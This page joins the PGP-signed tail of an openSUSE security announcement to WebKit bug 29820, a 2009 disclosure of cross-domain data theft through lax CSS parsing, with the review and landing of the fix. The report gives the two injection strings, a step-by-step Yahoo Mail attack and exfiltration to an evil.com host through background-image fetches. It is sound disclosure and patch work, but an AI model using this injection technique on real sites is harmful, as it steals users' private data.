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
=ypVs
- -----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (GNU/Linux)
iQEVAwUBTT68X3ey5gA9JdPZAQJLkAgAmUrmWlDW0jsub/lcN+oSmrfu3Lk6EqfM
ZmUr4pkgqdHnk/bAoqCCCy+woaL2vmvZOTZkQlkX6Fw1Ar/gFVGcYuVaITFayyQh
qAma9p2Y1PWQzSy0S8HTNiJM8tW5lBanhKaemGF3liPItGrRbW9zxHs/UeO+rzrn
wZ2w5fmoO5T10j/Xkh+gDPKUyqEiYVLQ9oAhfC+bA3eQLb3ODNXNViDvvh+BROjr
jtiWFLhiJwi/bm6YlmWDl1qrUddHwuMhidcf1MiEuLgiIZ6ZUflk2YZd6TKr6Rl1
s6Fn2g87x0rpFigXDz+4RWisuSZ9PDe+Neo9ePYeeCFgkiJHvo6SEA==
=aaX0
-----END PGP SIGNATURE-----
--
~
~ perl self.pl
~ $\_='print"\$\_=\47$\_\47;eval"';eval
~ krahmer@suse.de - SuSE Security Team
~ SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/C2VK7FPKD3ZEG555N25GLTFTZJJB237A/#C2VK7FPKD3ZEG555N25GLTFTZJJB237A)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugs.webkit.org_701203d5_20250125_142607.html ===

 [WebKit Bugzilla](./)

* [New](enter_bug.cgi)
* [Browse](describecomponents.cgi)
* Log In
  ×

  Sign in with GitHub

  or

   Remember my login
  [Create Account](/createaccount.cgi)
  ·
  [Forgot Password](show_bug.cgi?id=29820&GoAheadAndLogIn=1#forgot)

  ## Forgotten password account recovery

RESOLVED
FIXED
[29820](show_bug.cgi?id=29820)

Lax CSS parsing leads to limited cross-domain theft for a subset of sites
```
https://bugs.webkit.org/show_bug.cgi?id=29820
```

[Summary](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Lax CSS parsing leads to limited cross-domain theft for a subset of sites

Chris Evans

[Reported](show_bug.cgi?id=29820#c0)
2009-09-28 11:40:00 PDT

[Apologies for not filing this sooner. I thought I had filed it, but it seems not. I've been sat on this for too long. Since this affects all browsers equally, I was going to just discuss it on my blog and let the web community figure out the best way to address this. However, I thought it would be polite to offer WebKit / Safari a chance to fix it first].
The attack involves cross-domain CSS stylesheet loading. Because the CSS
parser is very lax, it will skip over any amount of preceding and following
junk, in its quest to find a valid selector. Here is an example of a valid
selector:
body { background-image: url('<http://www.evil.com/blah>'); }
If a construct like this can be forced to appear anywhere in a cross-domain document, then cross-domain theft may be possible. The attacker can introduce this construct into a page by injecting two strings:
1) {}body{background-image:url('<http://google.com/>
(Note that the seemingly redundant {} is to resync
the CSS parser to make sure the evil descriptor parses properly. Further note that having the url start like a valid url is required to steal the text in some browsers).
2) ');}
Any anything between those two strings will then be cross-domain stealable! The data is stolen cross domain with e.g.
window.getComputedStyle(body\_element, null).getPropertyValue('background-image');
(This works in most browsers; for IE, you use ele.currentStyle.backgroundImage)
There are a surprising number of places in internet sites where an attacker
can do this. It can apply to HTML, XML, JSON, XHTML, etc.
At this point, an example is probably useful. To set up for this example, you need:
a) Get a Yahoo! Mail account.
b) Make sure you are logged into it.
c) E-mail the target victim Yahoo! account with the subject
');}
d) Wait a bit, so that some sensitive e-mails fill the inbox. (Or just simulate one).
e) E-mail the target victim Yahoo! account with the subject
{}body{background-image:url('<http://google.com/>
f) Send victim to theft page <https://cevans-app.appspot.com/static/yahoocss.html>
g) The stolen text shown is achieved via cross-domain CSS theft.
Other good examples I've had success with are social networking sites, where the attacker gets to leave arbitrary-text comments which are rendered on the victim's trusted page.
The main common construct that prevents exploitation is newlines.
Obviously, newlines cannot be considered a defense! Escaping or encoding of quote characters can also interfere with exploitation. One useful trick: if ' is escaped, use " to enclose the CSS string.
Part 2 (on possible solutions) to follow.

| Attachments | | |
| --- | --- | --- |
| [**Patch and test**](attachment.cgi?id=42540 "View the content of the attachment") (18.01 KB, patch)  [2009-11-04 20:39 PST](#attach_42540 "Go to the comment associated with the attachment"), Chris Evans | hyatt: review- | [Details](attachment.cgi?id=42540&action=edit)[Formatted Diff](attachment.cgi?id=42540&action=prettypatch)[Diff](attachment.cgi?id=42540&action=diff) |
| [**Address all comments from review**](attachment.cgi?id=43007 "View the content of the attachment") (21.64 KB, patch)  [2009-11-11 14:39 PST](#attach_43007 "Go to the comment associated with the attachment"), Chris Evans | hyatt: review- | [Details](attachment.cgi?id=43007&action=edit)[Formatted Diff](attachment.cgi?id=43007&action=prettypatch)[Diff](attachment.cgi?id=43007&action=diff) |
| [**Latest patch -- merge with WebKit head**](attachment.cgi?id=44830 "View the content of the attachment") (21.16 KB, patch)  [2009-12-14 18:02 PST](#attach_44830 "Go to the comment associated with the attachment"), Chris Evans | abarth: review+ | [Details](attachment.cgi?id=44830&action=edit)[Formatted Diff](attachment.cgi?id=44830&action=prettypatch)[Diff](attachment.cgi?id=44830&action=diff) |
| [Show Obsolete](#a0) (1) [View All](attachment.cgi?bugid=29820&action=viewall&hide_obsolete=1)  [Add attachment](attachment.cgi?bugid=29820&action=enter) *proposed patch, testcase, etc.* | | |

David Kilzer (:ddkilzer)

[Comment 1](show_bug.cgi?id=29820#c1)
2009-09-28 11:43:25 PDT

<rdar://problem/7258451>

Chris Evans

[Comment 2](show_bug.cgi?id=29820#c2)
2009-09-28 11:54:52 PDT

Possible solutions.
First, there are some solutions it is easy to reject:
1) Restrict read of CSS text if it came from a different domain.
This is a useful defense that I filed a while ago in a different bug. But it
will not help in this case. The attacker can simply use
<http://www.attacker.com/> as a prefix for the background-image value, and wait
for the HTTP GET to arrive which includes the stolen text in the payload.
2) Do not send cookies for cross-domain CSS loads.
This probably breaks a load of sites? It is certainly a riskier approach. I
have not dared try it!
The solution that I'm playing with is as follows:
- Activate "strict MIME type required" in the event that the CSS was loaded
(via link tag or @import) as a cross-domain resource.
- Also, crash hard if a CSS load fails due to strict MIME type test failure.
I've been running my build locally with these changes for a few days and there
seems to be some merit in this approach, i.e. my browser hasn't crashed apart
from when I hit my attack URLs.
I see that WebKit has a history of defaulting to "strict MIME type required"
for \_all\_ CSS loads, and that historically broke some sites like dell.com and
was reverted.
Perhaps the web at large now has its MIME types in order well enough to at
least enforce strict for cross-domain CSS loads? If too much breaks, we have
the additional level we can introduce of trying to parse the cross-domain CSS
but bailing on first syntax error. I'd like to avoid a test that is going that
deep into nuance, however.

Chris Evans

[Comment 3](show_bug.cgi?id=29820#c3)
2009-09-28 12:06:09 PDT

Here's the patch I'm running with. Including 3rd chunk which crashes on mismatched MIME type when strict mode is on... (note -- not adding as an attachment because it most certainly is not a proposed patch :P )
Index: html/HTMLLinkElement.cpp
===================================================================
--- html/HTMLLinkElement.cpp (revision 48734)
+++ html/HTMLLinkElement.cpp (working copy)
@@ -252,6 +252,12 @@
if (enforceMIMEType && document()->page() && !document()->page()->settings()->enforceCSSMIMETypeInStrictMode())
enforceMIMEType = false;
+ // If we're loading a stylesheet cross-domain, always enforce a stricter
+ // MIME type check. This prevents an attacker playing games by injecting
+ // CSS strings into HTML, XML, JSON, etc. etc.
+ if (!document()->securityOrigin()->canRequest(KURL(ParsedURLString, url)))
+ enforceMIMEType = true;
+
m\_sheet->parseString(sheet->sheetText(enforceMIMEType), strictParsing);
m\_sheet->setTitle(title());
Index: css/CSSImportRule.cpp
===================================================================
--- css/CSSImportRule.cpp (revision 48734)
+++ css/CSSImportRule.cpp (working copy)
@@ -26,6 +26,7 @@
#include "DocLoader.h"
#include "Document.h"
#include "MediaList.h"
+#include "SecurityOrigin.h"
#include "Settings.h"
#include <wtf/StdLibExtras.h>
@@ -62,7 +63,10 @@
CSSStyleSheet\* parent = parentStyleSheet();
bool strict = !parent || parent->useStrictParsing();
- String sheetText = sheet->sheetText(strict);
+ bool enforceMIMEType = strict;
+ if (!parent || !parent->doc() || !parent->doc()->securityOrigin()->canRequest(KURL(ParsedURLString, url)))
+ enforceMIMEType = true;
+ String sheetText = sheet->sheetText(enforceMIMEType);
m\_styleSheet->parseString(sheetText, strict);
if (strict && parent && parent->doc() && parent->doc()->settings() && parent->doc()->settings()->needsSiteSpecificQuirks()) {
Index: loader/CachedCSSStyleSheet.cpp
===================================================================
--- loader/CachedCSSStyleSheet.cpp (revision 48734)
+++ loader/CachedCSSStyleSheet.cpp (working copy)
@@ -138,7 +138,9 @@
// This code defaults to allowing the stylesheet for non-HTTP protocols so
// folks can use standards mode for local HTML documents.
String mimeType = extractMIMETypeFromMediaType(response().httpHeaderField("Content-Type"));
- return mimeType.isEmpty() || equalIgnoringCase(mimeType, "text/css") || equalIgnoringCase(mimeType, "application/x-unknown-content-type");
+ if (!(mimeType.isEmpty() || equalIgnoringCase(mimeType, "text/css") || equalIgnoringCase(mimeType, "application/x-unknown-content-type")))
+ \*((char\*)NULL) = '\0';
+ return true;
}
}

Maciej Stachowiak

[Comment 4](show_bug.cgi?id=29820#c4)
2009-09-28 22:23:54 PDT

(In reply to [comment #2](show_bug.cgi?id=29820#c2))
>
>
> I see that WebKit has a history of defaulting to "strict MIME type required"
> for \_all\_ CSS loads, and that historically broke some sites like dell.com and
> was reverted.
> Perhaps the web at large now has its MIME types in order well enough to at
> least enforce strict for cross-domain CSS loads? If too much breaks, we have
> the additional level we can introduce of trying to parse the cross-domain CSS
> but bailing on first syntax error. I'd like to avoid a test that is going that
> deep into nuance, however.
We could experiment with doing that, but the risk may be somewhat high. The security benefit could be worth it however.

Chris Evans

[Comment 5](show_bug.cgi?id=29820#c5)
2009-09-29 08:23:59 PDT

Note that any experimental WebKit change would get an automatic workout in the Chrome dev channel builds fairly quickly ;-)

Adam Barth

[Comment 6](show_bug.cgi?id=29820#c6)
2009-09-29 13:19:11 PDT

(In reply to [comment #5](show_bug.cgi?id=29820#c5))
> Note that any experimental WebKit change would get an automatic workout in the
> Chrome dev channel builds fairly quickly ;-)
This is a good opportunity to use UMA to see which of these mitigations are feasible w.r.t. compatibility.

Chris Evans

[Comment 7](show_bug.cgi?id=29820#c7)
2009-09-29 13:40:38 PDT

This is something I continue to fail to have time to look at -- hence the filing of the bug upstream :-/

Chris Evans

[Comment 8](show_bug.cgi?id=29820#c8)
2009-11-04 14:20:07 PST

Yeah, I got a good patch which is both conservatively secure and conservatively compatible. Compatibility has been checked with a run across 500,000 URLs, and in fact the solution was derived from these URLs. I'll upload the patch once I have a good test too :)

Chris Evans

[Comment 9](show_bug.cgi?id=29820#c9)
2009-11-04 20:38:32 PST

Patch to follow, I think it's good. I've done a lot of testing including:
- Full LayoutTests (clean)
- Mining of 500,000 URLs for interesting cross-domain CSS usage. Best I know, the only site affected by this is <http://practiceexam.keys2drive.ca/quiz.php> which looks slightly different but is still acceptable and usable. Regrettably, this pages uses text/html for a cross-domain CSS load and prefixes valid CSS with "<style>".
- Turns out that cross-domain text/html with a valid CSS payload, and text/plain with a valid CSS payload does occur (28 occurrences in 500,000 URLs including curiously configure.dell.com)! Therefore this case is accounted for.
- Other common MIME types mistakenly used for cross-domain CSS loads include application/octet-stream (53 / 500,000), application/css (1), application/x-pointplus (1)

Chris Evans

[Comment 10](show_bug.cgi?id=29820#c10)
2009-11-04 20:39:23 PST

Created [attachment 42540](attachment.cgi?id=42540&action=diff "Patch and test") [[details]](attachment.cgi?id=42540&action=edit "Patch and test")
Patch and test

Adam Barth

[Comment 11](show_bug.cgi?id=29820#c11)
2009-11-05 08:22:51 PST

Nice idea Chris. I'm going to let an expert in this area review the actual code, but I like the approach.
Have you shared the approach with the other browser vendors? It would be best if we all did the same thing.

Maciej Stachowiak

[Comment 12](show_bug.cgi?id=29820#c12)
2009-11-07 19:24:44 PST

This looks like a promising approach (have not reviewed the CSS parser details yet).
I'm sorry to bring these to the table late, but here are some other ideas I thought of:
1) For cross-site stylesheet loads, disable Cookies, HTTP Auth, and sending of client-side certs (or perhaps any SSL). Then the only risk is to content that is only protected by a firewall. I'm not sure if this would break anything, but it would depend less on the details of the CSS parser so it may be more robust.
2) For cross-site styleseet loads, if the stylesheet is returned with an incorrect MIME type, disable scripting access to the stylesheet (but still apply the styles). I'm not sure if this would be sufficiently compatible or if it would fully close the hole.
Any thoughts on these?

Sam Weinig

[Comment 13](show_bug.cgi?id=29820#c13)
2009-11-08 14:48:09 PST

> 2) For cross-site styleseet loads, if the stylesheet is returned with an
> incorrect MIME type, disable scripting access to the stylesheet (but still
> apply the styles). I'm not sure if this would be sufficiently compatible or if
> it would fully close the hole.
>
If I am not mistaken, I believe we now always disallow scripting access to cross-site stylesheets. (see <http://trac.webkit.org/changeset/50587>).
I am cc'ing hyatt, who would probably be the best person the review the change to the CSS parser.

Sam Weinig

[Comment 14](show_bug.cgi?id=29820#c14)
2009-11-08 14:59:20 PST

Comment on [attachment 42540](attachment.cgi?id=42540&action=diff "Patch and test") [[details]](attachment.cgi?id=42540&action=edit "Patch and test")
Patch and test
Not a full review, just some passing comments
- I think we should be using the term crossOrigin instead of crossDomain since we are really talking about the origin tuple, not just the domain.
- I am not a fan of the term "good" in the context you are using it. What is a "good" header? What is a "good" CSS rule? Please be more explicit with those names.
- Is this something we should add a Setting for while it is still experimental?
> +void
> +CSSParser::invalidBlockHit() {
Two nits. The "void" should be on the same line as the rest of the function prototype. The { should be on the next line.

Chris Evans

[Comment 15](show_bug.cgi?id=29820#c15)
2009-11-08 21:18:29 PST

@Sam, [comment #13](show_bug.cgi?id=29820#c13): unfortunately, the referenced change does not prevent script access. It simply stops raw CSS rule text access via the "cssRules" array (bringing WebKit in line with all other browsers). It leaves the getComputedStyle().getPropertyValue() avenue open. And even if we closed that, it's still not good enough, see next comment...
@Sam, [comment #14](show_bug.cgi?id=29820#c14): thanks. I'll use "syntacticallyValid" instead of "good".

Chris Evans

[Comment 16](show_bug.cgi?id=29820#c16)
2009-11-08 22:24:03 PST

@Maciej, [comment #12](show_bug.cgi?id=29820#c12):
Idea #2 isn't secure. The Yahoo Mail example given does not need script to steal the data. The stolen data is effectively sent to evil.com for the fetch of the background-image URL. There are probably other ways that data can be stolen by monitoring the effects of CSS.
Idea #1 is more interesting. I thought I had a good reason to not go that route, but I seem to have forgotten it. There are certainly sites that rely on cross-origin authenticated <script> loads; I'm not sure about CSS.
Mainly, it would be very challenging to semi-automatically test in the same way as I tested my change.

Chris Evans

[Comment 17](show_bug.cgi?id=29820#c17)
2009-11-09 22:51:17 PST

Hyatt, any thoughts?

Maciej Stachowiak

[Comment 18](show_bug.cgi?id=29820#c18)
2009-11-10 18:36:42 PST

(In reply to [comment #16](show_bug.cgi?id=29820#c16))
> @Maciej, [comment #12](show_bug.cgi?id=29820#c12):
>
> Idea #2 isn't secure. The Yahoo Mail example given does not need script to
> steal the data. The stolen data is effectively sent to evil.com for the fetch
> of the background-image URL. There are probably other ways that data can be
> stolen by monitoring the effects of CSS.
Good point. I withdraw the idea.
> Idea #1 is more interesting. I thought I had a good reason to not go that
> route, but I seem to have forgotten it. There are certainly sites that rely on
> cross-origin authenticated <script> loads; I'm not sure about CSS.
> Mainly, it would be very challenging to semi-automatically test in the same way
> as I tested my change.
I heard recently that IE no longer sends Cookie headers for cross-site <script> loads, which is what made me think of the idea for styles. I think we should consider #1 if it turns out to be sufficiently compatible, perhaps in combination with your change.
I will try to get someone with CSS parser knowledge to look at your patch.

Chris Evans

[Comment 19](show_bug.cgi?id=29820#c19)
2009-11-10 18:48:40 PST

Where did you hear that IE doesn't sent cookies for cross-site <script> loads? Maybe you're thinking of Gazelle?
I spoke with Charlie Reis recently and we talked about just this. A lot of sites unfortunately depend on it. <https://pip.verisignlabs.com/> was the example given. I've not checked myself, but Charlie is pretty reliable.
The reason I prefer the "stricter CSS" approach is that sites are welcome to depend on cookies being sent for cross-origin CSS, and it's not an unreasonable thing to do. On the other hand, it's not reasonable for sites to load cross-origin CSS with bust-up MIME types with a CSS syntax error preceeding valid CSS.
However, I would of course be delighted if we could just not send cookies for cross-site script, CSS etc. I just think it'll break stuff. May be worth an experiment in the future...

Dave Hyatt

[Comment 20](show_bug.cgi?id=29820#c20)
2009-11-11 10:54:01 PST

Comment on [attachment 42540](attachment.cgi?id=42540&action=diff "Patch and test") [[details]](attachment.cgi?id=42540&action=edit "Patch and test")
Patch and test
You need to patch XML processing instructions also, and there needs to be a test for those.

Chris Evans

[Comment 21](show_bug.cgi?id=29820#c21)
2009-11-11 11:24:20 PST

I agree the need to test XML processing instructions. I'll get on that.
However, I don't think a code change is needed because "strict" mode is enforced, which requires a valid CSS MIME type. This is certainly subtle -- strict mode is used because of a defaulted C++ parameter, so I'll add a comment.

Chris Evans

[Comment 22](show_bug.cgi?id=29820#c22)
2009-11-11 14:39:15 PST

Created [attachment 43007](attachment.cgi?id=43007&action=diff "Address all comments from review") [[details]](attachment.cgi?id=43007&action=edit "Address all comments from review")
Address all comments from review

Chris Evans

[Comment 23](show_bug.cgi?id=29820#c23)
2009-11-11 14:43:24 PST

New patch updated, featuring:
- Fixes Sam's naming and style comments.
- Adds a test for the CSS in XML case noted by Dave.
- Adds a comment and makes the "strict" mode of CSS in XML more explicit.
- Tweaks one of the tests to check that a semantically invalid descriptor (i.e. contains unknown property) loads OK.
- Better ChangeLog entry.

Chris Evans

[Comment 24](show_bug.cgi?id=29820#c24)
2009-11-13 15:46:16 PST

Ping? I'm now away until Tuesday, and then limited availability for Tues & Weds prior to three weeks away. I'd rather not lose this small window for landing this.

Dave Hyatt

[Comment 25](show_bug.cgi?id=29820#c25)
2009-11-16 14:46:40 PST

Comment on [attachment 43007](attachment.cgi?id=43007&action=diff "Address all comments from review") [[details]](attachment.cgi?id=43007&action=edit "Address all comments from review")
Address all comments from review
The CSSParser changes seems iffy to me. Why limit to just a "header" check? What if you hit an invalid block first and then hit some valid rules following the invalid block?
What is the point of the extra enforceMIMEType argument to parseString? It looks like it matches whether or not you're using strictParsing always, so I don't get the point of it.

Dave Hyatt

[Comment 26](show_bug.cgi?id=29820#c26)
2009-11-16 14:57:58 PST

That previous comment about enforceMIMEType may not have been totally clear. I'm specifically wondering about CSSImportRule. It looks like enforceMIMEType is never being checked against the setting:
HTMLLinkElement has the following code:
if (enforceMIMEType && document()->page() && !document()->page()->settings()->enforceCSSMIMETypeInStrictMode())
enforceMIMEType = false;
This check was really only necessary for iWeb, and we didn't bother pushing it into import rules. You added the enforceMIMEType variable to the CSSImportRule check but then didn't bother doing anything with it, so it just matches strictParsing.
I don't see a need for that check in sub-stylesheets, so please just get rid of enforceMIMEType in CSSImportRule.

Chris Evans

[Comment 27](show_bug.cgi?id=29820#c27)
2009-11-17 18:31:14 PST

Thanks for taking a detailed look, Dave.
@25: "The CSSParser changes seems iffy to me. Why limit to just a "header" check?
What if you hit an invalid block first and then hit some valid rules following
the invalid block?"
The attacker, unfortunately, can easily inject some valid rules after some preceding junk. So in that case (invalid block then valid rules), we must reject.
@26: I probably need to simply think about this some more, but I'm not sure I understand the suggestion yet. "enforceMIMEType" is a renaming of "strict" to make the variable name clearer. I've tried to minimally disturb the logic from the existing state. All I've done, really, is engage "strict" mode if there is cross-origin CSS loading that does not start with what looks like CSS.

Chris Evans

[Comment 28](show_bug.cgi?id=29820#c28)
2009-11-29 21:35:08 PST

Any thoughts re: my [comment #27](show_bug.cgi?id=29820#c27)?
If there are still concerns, perhaps we should schedule lunch @ Apple to finally land this thing? I'm currently on vacation but Weds 9th Dec would work. I don't want to delay some form of landed solution too close to the Dec 28th deadline.

Chris Evans

[Comment 29](show_bug.cgi?id=29820#c29)
2009-12-08 14:29:41 PST

@26: I've now had the time to have a more thorough look. I believe the only logic change I made is to add the cross-domain check.
Perhaps the confusion is the rename of "strict" to the more descriptive "enforceMIMEType". So, "enforceMIMEType" is definitely used -- and used with the exact same logic as before the patch.

Dave Hyatt

[Comment 30](show_bug.cgi?id=29820#c30)
2009-12-14 10:00:00 PST

"(In reply to [comment #27](show_bug.cgi?id=29820#c27))
>
> @26: I probably need to simply think about this some more, but I'm not sure I
> understand the suggestion yet. "enforceMIMEType" is a renaming of "strict" to
> make the variable name clearer. I've tried to minimally disturb the logic from
> the existing state. All I've done, really, is engage "strict" mode if there is
> cross-origin CSS loading that does not start with what looks like CSS.
Except you haven't made it clearer. That variable name is wrong in that context, and the change is unnecessary. Look at HTMLLinkElement:
m\_sheet->parseString(sheetText, strictParsing);
Now look at what you did in CSSImportRule:
m\_styleSheet->parseString(sheetText, enforceMIMEType);
The argument to parseString is whether or not CSS Is using strict parsing. It's not just about MIME type enforcement. You just didn't need to introduce that variable name here, since that variable was only introduced as a local in the other spot so that it could be set to false if the setting was present.

Chris Evans

[Comment 31](show_bug.cgi?id=29820#c31)
2009-12-14 16:07:39 PST

Thanks, Dave. I see and agree with the concern now.
I fixed it, but ironically, I discovered upon "svn update" that [r52032](https://commits.webkit.org/r52032) actually introduces a split of "strict" vs. "enforeMIMEType" to the CSS import code. I'm doing a manual merge now and will post an updated patch shortly.

Chris Evans

[Comment 32](show_bug.cgi?id=29820#c32)
2009-12-14 18:02:27 PST

Created [attachment 44830](attachment.cgi?id=44830&action=diff "Latest patch -- merge with WebKit head") [[details]](attachment.cgi?id=44830&action=edit "Latest patch -- merge with WebKit head")
Latest patch -- merge with WebKit head

Chris Evans

[Comment 33](show_bug.cgi?id=29820#c33)
2009-12-14 18:06:14 PST

Ok, updated patch attached.
Note that "enforceMIMEType" was introduced by (completely unrelated) [r52032](https://commits.webkit.org/r52032). This makes the latest patch smaller, and sort of cancels the clarified complaint in [comment #30](show_bug.cgi?id=29820#c30) :)
Any further changes you would like?

Chris Evans

[Comment 34](show_bug.cgi?id=29820#c34)
2009-12-17 21:09:13 PST

Friendly ping? :)

Chris Evans

[Comment 35](show_bug.cgi?id=29820#c35)
2009-12-31 01:12:53 PST

Now public, via Mozilla checkin and my blog.
Unless there are further comments on the patch, can we get this landed?

Adam Barth

[Comment 36](show_bug.cgi?id=29820#c36)
2010-01-04 15:10:37 PST

Comment on [attachment 44830](attachment.cgi?id=44830&action=diff "Latest patch -- merge with WebKit head") [[details]](attachment.cgi?id=44830&action=edit "Latest patch -- merge with WebKit head")
Latest patch -- merge with WebKit head
Chris appears to have addressed hyatt's concerns. This security issue is public now and needs to get fixed as soon as possible. The discussion on this bug seems to have stalled.
As far as I can tell, the patch seems fine. Marking as review+. If you have concerns, let me know. If we need to iterate on this after landing, we can do that too.

Adam Barth

[Comment 37](show_bug.cgi?id=29820#c37)
2010-01-04 21:20:06 PST

Committed [r52784](https://commits.webkit.org/r52784): <<http://trac.webkit.org/changeset/52784>>

Chris Evans

[Comment 38](show_bug.cgi?id=29820#c38)
2010-08-09 16:01:14 PDT

Un-hiding; all very public by now and I want to fix the link from <http://www.owlfolio.org/htmletc/css-data-theft/>

Note
You need to
[log in](show_bug.cgi?id=29820&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

 [Status](page.cgi?id=fields.html#bug_status "A bug may be in any of a number of states.") |RESOLVED

resolved as
 [Resolution](page.cgi?id=fields.html#resolution "If a bug is in a resolved state, then one of these reasons will be given for its resolution.") |FIXED

 [Priority](page.cgi?id=fields.html#priority "Engineers prioritize their bugs using this field.") |P2

 [Severity](page.cgi?id=fields.html#bug_severity "How severe the bug is, or whether it's an enhancement.") |Normal

 [Classification](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") |Unclassified

 [Version](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | Other |
 [Hardware](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") |PC

 [OS](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") |All

 [Product](describecomponents.cgi "Bugs are categorised into Products and Components.") |Security

 [Component](describecomponents.cgi?product=Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") |Security

 [Assignee](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") |WebKit Security Group

Reported

2009-09-28 11:40 PDT

Modified

2023-11-23 05:06 PST
[History](show_activity.cgi?id=29820)

CC List

12
users
Show

abarth
ap
cevans
ddkilzer
hyatt
metadenz
mihnea
mitz
mjs
sam
vdanen
yong.li.webkit

